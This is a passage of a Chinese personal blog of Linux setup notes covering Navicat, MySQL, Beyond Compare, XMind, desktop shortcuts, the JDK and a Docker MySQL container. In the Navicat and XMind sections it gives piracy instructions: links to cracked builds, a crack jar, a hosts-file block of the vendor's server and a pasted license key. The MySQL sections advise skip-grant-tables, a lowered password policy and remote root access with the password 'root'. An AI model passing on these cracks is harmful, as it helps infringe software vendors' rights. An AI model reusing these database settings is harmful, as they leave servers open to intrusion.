进入到解压好的目录,启动
<code>./start_navicat</code>
启动成功。</p>
<p>将navicat快捷方式添加到桌面
<code>vim /usr/share/applications/navicat.desktop</code>
填写如下内容：注意修改路径</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[Desktop Entry]
</span></span><span style="display:flex;"><span>Encoding=UTF-8
</span></span><span style="display:flex;"><span>Name=Navicat Premium
</span></span><span style="display:flex;"><span>Comment=The Smarter Way to manage dadabase
</span></span><span style="display:flex;"><span>Exec=/bin/sh &#34;/home/wjy/install/navicat121_premium_cs_x64/start_navicat&#34;
</span></span><span style="display:flex;"><span>Icon=/home/wjy/install/navicat121_premium_cs_x64/navicat.png
</span></span><span style="display:flex;"><span>Categories=Application;Database;MySQL;navicat
</span></span><span style="display:flex;"><span>Version=1.0
</span></span><span style="display:flex;"><span>Type=Application
</span></span><span style="display:flex;"><span>Terminal=0
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后就可以在启动器搜索到navicat，可以将该应用添加到桌面。</p>
<p>编辑解压目录下的start_navicat文件，修改export LANG=”en_US.UTF-8”，改为export LANG=”zh_CN.UTF-8”。
进入后发现还是部分乱码，这时需要打开navicat，点击上边选项卡的第五个，为工具，点击下拉选最后一个选项，然后将常规、编辑器、记录三个位置的字体改成能正常显示的字体。</p>
<p>破解：
在windows破解好后，linux上安装相同版本，然后将windows，Navicat Premium目录下所有文件拷贝到linux，navicat121_premium_cs_x64中的Navicat目录。
其实就是在windows破解好后，再整体复制到linux替换原文件。不是非要自己的电脑是双系统，可以用别的windows电脑破解再copy。
可以直接下载如下windows破解版：https://pan.baidu.com/s/10z5Ozjqdhar1bj0YVR0GMA，提取码：z86k，不过这个是Navicat_11版本的。</p>
<h2 id="mysql">mysql<a hidden class="anchor" aria-hidden="true" href="#mysql">#</a></h2>
<p>安装
<code>sudo apt-get install mysql-server mysql-common mysql-client</code>
<code>sudo /etc/init.d/mysql restart</code></p>
<p>设置初始密码：
<code>sudo mysql_secure_installation</code>
按照引导设置密码</p>
<p>登录
<code>sudo mysql -u root -p</code>
必须带sudo，不然会出现<code>Access denied for user ‘root‘@‘localhost‘</code>
然后输入刚才设置的密码。</p>
<p>解决Access denied 问题：
参考地址：https://www.cnblogs.com/cpl9412290130/p/9583868.html</p>
<p>终端输入：
<code>sudo gedit /etc/mysql/mysql.conf.d/mysqld.cnf</code>
然后在这个配置文件中的[mysqld]这一块中加入skip-grant-tables这句话，位置随意，直接加在第一行即可。
作用：就是让你可以不用密码登录进去mysql。
重启mysql：<code>service mysql restart</code></p>
<p>在终端上输入mysql -u root -p，遇见输入密码的提示直接回车即可,进入mysql后，分别执行下面三句话：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>use mysql;   然后敲回车
</span></span><span style="display:flex;"><span>update user set authentication_string=password(&#34;你的密码&#34;) where user=&#34;root&#34;;  然后敲回车
</span></span><span style="display:flex;"><span>flush privileges;  然后敲回车
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后输入quit，退出mysql。</p>
<p>重新进入到mysqld.cnf文件中去把刚开始加的skip-grant-tables这条语句给注释掉。</p>
<p>再返回终端输入mysql -u root -p，应该就可以进入数据库了。</p>
<p>如果此时还是报出错误，那么就需要返回step3中，把注释掉的那条语句重新生效（就是删除#符号），重新进入mysql中，先选择一个数据库（use mysql;）,然后输入select user,plugin from user;
可以看到在执行了select user,plugin from user;后，错误原因是因为plugin root的字段是auth_socket，那我们改掉它为下面的mysql_native_password就行了。输入：
<code>update user set authentication_string=password(&quot;ln122920&quot;),plugin='mysql_native_password' where user='root';</code>
然后回车执行以下，再输入select user,plugin from user;回车，我们能看到root用户的字段改成功了。
最后quit退出,再次mysql -u root -p，成功！</p>
<p>重启服务：
<code>service mysql restart</code></p>
<p>修改密码级别：
<code>set global validate_password_policy=0;</code>
<code>set global validate_password_length=4;</code></p>
<h3 id="配置远程连接">配置远程连接<a hidden class="anchor" aria-hidden="true" href="#配置远程连接">#</a></h3>
<ol>
<li>
<p>修改配置文件
<code>sudo gedit /etc/mysql/mysql.conf.d/mysqld.cnf</code>
找到<code>bind-address = 127.0.0.1</code>，将后边的ip修改为：<code>0.0.0.0</code></p>
</li>
<li>
<p>为需要远程登录的用户赋予权限
为root用户赋予权限：
<code>grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;</code>
注意修改<code>identified by</code>后边的密码。
可能会报错：
<code> Your password does not satisfy the current policy requirements</code>
这时修改密码级别：
<code>set global validate_password_policy=0;</code>
<code>set global validate_password_length=4;</code></p>
</li>
</ol>
<p>然后执行赋权语句成功，刷新权限：
<code>flush privileges;</code></p>
<p>重启mysql服务：
<code>service mysql restart</code></p>
<h2 id="beyond-compare">beyond compare<a hidden class="anchor" aria-hidden="true" href="#beyond-compare">#</a></h2>
<p><a href="https://www.scootersoftware.com/download.php?zz=kb_linux_install">https://www.scootersoftware.com/download.php?zz=kb_linux_install</a>
查看官网，通过官网提示安装</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget https://www.scootersoftware.com/bcompare-4.2.9.23626_amd64.deb
</span></span><span style="display:flex;"><span>sudo apt-get update
</span></span><span style="display:flex;"><span>sudo apt-get install gdebi-core
</span></span><span style="display:flex;"><span>sudo gdebi bcompare-4.2.9.23626_amd64.deb
</span></span></code></pre></td></tr></table>
</div>
</div><p>卸载
<code>sudo apt-get remove bcompare</code></p>
<h2 id="xmind">xmind<a hidden class="anchor" aria-hidden="true" href="#xmind">#</a></h2>
<p>官网下载linux客户端：
<a href="https://www.xmind.cn/download/xmind8/">https://www.xmind.cn/download/xmind8/</a>
一定要下载zip版的。</p>
<p>下载破解文件：
<a href="https://pan.baidu.com/s/1DOYU_OuOrIUPJoywsQswVA">https://pan.baidu.com/s/1DOYU_OuOrIUPJoywsQswVA</a>
提取码：f3jj</p>
<p>将<code>XMind_amd64.tar.gz</code>下的两个文件<code>XMind.ini</code>和<code>XMindCrack.jar</code>放到<code>XMind_amd64</code>目录下。</p>
<p>通过如下命令修改hosts文件：
<code>sudo vi /etc/hosts</code>
在文件的末尾添加：
<code>127.0.0.1 www.xmind.net</code></p>
<p>回到解压后的文件夹的根目录，运行<code>./setup.sh.</code>，安装好依赖库之后，再次进入XMind_amd64，双击运行XMind文件。
在XMind主界面依次：<code>Help(帮助) -&gt; License(序列号)</code>，复制以下license key填入，邮箱随便填：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后激活成功。</p>
<h2 id="字体">字体<a hidden class="anchor" aria-hidden="true" href="#字体">#</a></h2>
<ul>
<li>终端字体
文泉驿等宽微米黑 Bold</li>
</ul>
<h2 id="快捷键">快捷键<a hidden class="anchor" aria-hidden="true" href="#快捷键">#</a></h2>
<ul>
<li>在应用程序中搜索&quot;窗口管理器&rdquo;，然后点击键盘，将：
<ul>
<li>&ldquo;工作区&quot;和&quot;移动窗口至工作去&quot;等与ctrl和alt相关的快捷键全部清除</li>
<li>在窗口管理器-键盘，找到&quot;显示桌面&rdquo;，将快捷键改为<strong>super+D</strong>(保持与windows一致)</li>
</ul>
</li>
<li>在应用程序中搜索&quot;键盘&quot;，应用程序和快捷键选项卡，找到：
<ul>
<li>/usr/bin/xflock4，修改为Super+L</li>
<li>xfce4-appfinder，保留原快捷键</li>
<li>x-terminal-emulator，修改为Alt+/</li>
</ul>
</li>
<li>ctrl+alt+s
这个快捷键是idea的setting的快捷键，但是在mint中被fcitx输入法占用了。
右键右下角的输入法，选择配置fcitx-&gt;全局配置-&gt;显示高级选项，找到想修改的快捷键，建议直接置空(选中后，点击esc)。</li>
</ul>
<h2 id="vi模式中上下左右键和回退键出现字母">VI模式中上下左右键和回退键出现字母<a hidden class="anchor" aria-hidden="true" href="#vi模式中上下左右键和回退键出现字母">#</a></h2>
<p><code>sudo vi /etc/vim/vimrc.tiny</code>
上下左右字母：
这个文件里面的倒数第二句话是“set compatible”改为“set nocompatible”</p>
<p>回退健：
在“set nocompatible”后面(下一行)加上
set backspace=2</p>
<h2 id="ctrlaltf12">ctrl+alt+f12<a hidden class="anchor" aria-hidden="true" href="#ctrlaltf12">#</a></h2>
<p>不只是linuxmint，Ubuntu、deepin等按这组快捷键都会黑屏，不要害怕，不是黑屏，ctrl+alt+f7可以返回。
ALT＋CTRL+F1——F6可进入6个终端，F7开始到F12有6个图形界面，f7是我们安装的图形界面，所以ctrl+alt+f7可以返回。
参考地址：https://askubuntu.com/questions/277517/what-does-ctrl-alt-f12-do</p>
<h2 id="主文件夹的中文文件夹改为英文">主文件夹的中文文件夹改为英文<a hidden class="anchor" aria-hidden="true" href="#主文件夹的中文文件夹改为英文">#</a></h2>
<p>因为是中文版，/home/wjy 下的用户目录都是中文的，在终端操作很不方便，需要切换输入法。而且纯命令行界面，中文文件夹会乱码，根本不知道是哪个是哪个。
打开终端，在终端中输入命令：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>export LANG=en_US
</span></span><span style="display:flex;"><span>xdg-user-dirs-gtk-update
</span></span></code></pre></td></tr></table>
</div>
</div><p>跳出对话框询问是否将目录转化为英文路径，同意并关闭。
在终端中输入命令：
<code>export LANG=zh_CN</code>
关闭终端，重启系统。下次进入系统，系统会提示是否把转化好的目录改回中文，选择不再提示，并取消修改(保留旧的，旧的就是重启之前改好的英文文件夹)。这样就完成了</p>
<h2 id="linuxmint弃坑">LinuxMint弃坑<a hidden class="anchor" aria-hidden="true" href="#linuxmint弃坑">#</a></h2>
<p>没有必要换linux。我使用过7年Linux桌面。想到哪说到哪吧
首先，Linux下开发用的应用软件奇缺，质量普遍不高，基本都只是凑合能用。除了jetbrain家的软件是良心系列，其他应用软件，良心的真是少之又少。
比如MySQL工具，就没有Windows上的好。mysql workbench不稳定，界面难用，而且有bug（使用mysql proxy会遇到），可能导致无法连接数据库。Navicat也只有wine版，默认连中文都处理不好，也很卡。那些说mycli的装逼犯，就让他装逼吧。基于Java的那几个MySQL工具，问题也不少。我现在是dbvis+mysql workbench凑合远程终端也没有能超越xshell的存在。
聊天工具QQ，钉钉，微信，也只是勉强能用的地步（比如wine qq不支持边缘吸附，网页版钉钉不支持查看加密消息。。）。输入法极其难用，Linux下有搜狗输入法算是最好的中文输入法了（那些说rime的装逼犯你别管），但是这货内存泄漏很严重，时不时就占据个四五G内存。
WPS嘛，勉强能用，但是WPS不支持公式啊，图表也巨丑啊，或许一般场景呢是够了。
对新硬件支持也差。
还有，依赖关系是巨坑。装一个软件，引入一大堆软件，卸载软件也很容易搞崩系统（那些否认的你别理）。虽说有了flatpak格式，但是这个东西还没普及，而且占用空间远比windows大。如图，一个小小的截图，190M体积，在Windows下，只要1%的体积。</p>
<h1 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h1>
<h2 id="需要安装什么">需要安装什么<a hidden class="anchor" aria-hidden="true" href="#需要安装什么">#</a></h2>
<ol>
<li>安装jdk</li>
<li>安装docker</li>
<li>通过docker安装mysql</li>
<li>通过docker安装zookeeper</li>
<li>安装redis</li>
<li>安装tomcat(为了安装jenkins)</li>
<li>war包安装jenkins</li>
<li>安装maven</li>
<li>安装git</li>
<li>安装nginx</li>
</ol>
<h2 id="jdk-1">jdk<a hidden class="anchor" aria-hidden="true" href="#jdk-1">#</a></h2>
<p>可以选择卸载系统自带的OpenJDK以及相关的java文件，不卸载也没关系，直接修改<code>/etc/profile</code>即可。
检查是否安装了jdk：
<code>java -version</code>
可能已经安装openJDK，这里需要先卸载掉：
<code>rpm -qa | grep java</code>
命令说明：
rpm：管理套件
-qa：使用询问模式，查询所有套件
grep：查找文件里符合条件的字符串
java：查找包含java字符串的文件</p>
<p>把在检查出的列表中前缀带<code>java</code>的文件全部删除。
完整的删除文件的命令，在命令窗口键入：
<code>rpm -e --nodeps java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64</code>
命令介绍：
rpm：管理套件
-e：删除指定的套件
&ndash;nodeps：不验证套件档的相互关联性</p>
<p>检查是否删除成功，再次输入：
<code>java -version</code>
<code>command not found</code>
代表删除成功，如果还没有删除，则用<code>yum -y remove</code>去删除他们。</p>
<h3 id="普通方式安装jdk">普通方式安装JDK<a hidden class="anchor" aria-hidden="true" href="#普通方式安装jdk">#</a></h3>
<p><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html">官网下载jdk1.8linux安装包</a>
下载<code>Linux64...x64.tar.gz</code>这个包，只有这一个包符合我们的要求。
下载完通过FileZilla上传到服务器的理想位置，我上传到<code>/usr/local/src</code>。
然后再复制到<code>/usr/local</code>，这里是我们的安装位置。<code>cp jdk-8u211-linux-x64.tar.gz /usr/local</code>
解压：<code>tar -zxvf jdk-8u211-linux-x64.tar.gz</code>
删除JDK压缩包：<code>rm -f jdk-8u211-linux-x64.tar.gz</code>
编辑全局变量：<code>vim /etc/profile</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>#java environment
</span></span><span style="display:flex;"><span>export JAVA_HOME=/usr/local/jdk1.8.0_211
</span></span><span style="display:flex;"><span>export CLASSPATH=.:${JAVA_HOME}/jre/lib/rt.jar:${JAVA_HOME}/lib/dt.jar:${JAVA_HOME}/lib/tools.jar
</span></span><span style="display:flex;"><span>export PATH=$PATH:${JAVA_HOME}/bin
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意修改为自己的jdk安装路径，然后保存退出。
让刚刚设置的环境变量生效<code>source /etc/profile</code>
检查是否配置成功<code>java -version</code>，出现版本号证明成功。
注意：JDK安装在哪个用户下，就是给哪个用户使用。
<a href="https://www.cnblogs.com/sxdcgaq8080/p/7492426.html">参考地址</a></p>
<h2 id="mysql-1">mysql<a hidden class="anchor" aria-hidden="true" href="#mysql-1">#</a></h2>
<h3 id="docker安装mysql">docker安装mysql<a hidden class="anchor" aria-hidden="true" href="#docker安装mysql">#</a></h3>
<p>查看docker仓库中的mysql版本：
<code>docker search mysql</code>
<a href="https://hub.docker.com/search/?isAutomated=0&amp;isOfficial=0&amp;page=1&amp;pullCount=0&amp;q=mysql&amp;starCount=0">可从DockerHub上查看可下载的mysql版本</a>
<a href="https://hub.docker.com/_/mysql/">也可参照dockerHub上mysql的文档来安装</a>
<a href="https://www.runoob.com/docker/docker-install-mysql.html">也可以通过Dockerfile构建mysql</a></p>
<p>我们下载5.7版本：
<code>docker pull mysql:5.7</code></p>
<p>查看docker镜像：
<code>docker images | grep mysql</code></p>
<p>根据镜像说明可知：
默认的配置文件是：<code>/etc/mysql/my.cnf</code>
默认的数据目录是：<code>/var/lib/mysql</code></p>
<p>创建实例并启动：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -p 3306:3306 --name mysql <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold"></span>-v /mydata/mysql/log:/var/log/mysql <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold"></span>-v /mydata/mysql/data:/var/lib/mysql <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold"></span>-v /mydata/mysql/conf:/etc/mysql <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold"></span>-e MYSQL_ROOT_PASSWORD=root <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold"></span>-d mysql:5.7
</span></span></code></pre></td></tr></table>
</div>
</div><p>参数说明：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-p 3306:3306
</span></span><span style="display:flex;"><span>将容器的 <span style="color:#ff0;font-weight:bold">3306</span> 端口映射到主机的 <span style="color:#ff0;font-weight:bold">3306</span> 端口 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-v /mydata/mysql/conf:/etc/mysql
</span></span><span style="display:flex;"><span>将配置文件夹挂载到主机
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-v /mydata/mysql/log:/var/log/mysql
</span></span><span style="display:flex;"><span>将日志文件夹挂载到主机 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-v /mydata/mysql/data:/var/lib/mysql/
</span></span><span style="display:flex;"><span>将配置文件夹挂载到主机 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-e MYSQL_ROOT_PASSWORD=root
</span></span><span style="display:flex;"><span>初始化 root 用户的密码，在云服务器上，不要使用root当密码，很危险
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建并编辑mysql的配置文件：
<code>vim /mydata/mysql/conf/my.cnf</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
